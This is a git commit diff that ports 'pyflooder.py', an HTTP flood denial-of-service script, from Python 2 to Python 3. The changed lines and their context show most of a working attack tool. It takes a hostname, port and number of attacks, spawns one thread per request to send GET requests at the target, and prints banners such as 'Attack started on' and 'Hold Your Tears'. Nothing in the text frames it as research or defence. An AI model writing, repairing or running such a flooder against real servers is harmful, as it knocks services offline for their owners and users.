805778326bc822530ea9930084578519afe36bcf
mentalvenom <lukas.woodruff20@d155.org>
2019-09-22 16:19:55 -0500

    Update pyflooder.py

--- pyflooder.py
+++ pyflooder.py
@@ -25,7 +25,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
+    print("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -33,7 +33,7 @@ try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    print " ERROR\n Make sure you entered a correct website"
+    print(" ERROR\n Make sure you entered a correct website")
     sys.exit(2)
 
 # Create a shared variable for thread counts
@@ -47,7 +47,7 @@ def print_status():
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#"
+    print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#")
 
     thread_num_mutex.release()
 
@@ -73,19 +73,19 @@ def attack():
 
         # Send the request according to HTTP spec
         dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-    except socket.error, e:
-        print "\n [ No connection, server may be down ]: " + str(e)
+    except socket.error as e:
+        print("\n [ No connection, server may be down ]: " + str(e))
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
+print("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
 
 # Spawn a thread per request
 all_threads = []
-for i in xrange(num_requests):
+for i in range(num_requests):
     t1 = threading.Thread(target=attack)
     t1.start()
     all_threads.append(t1)
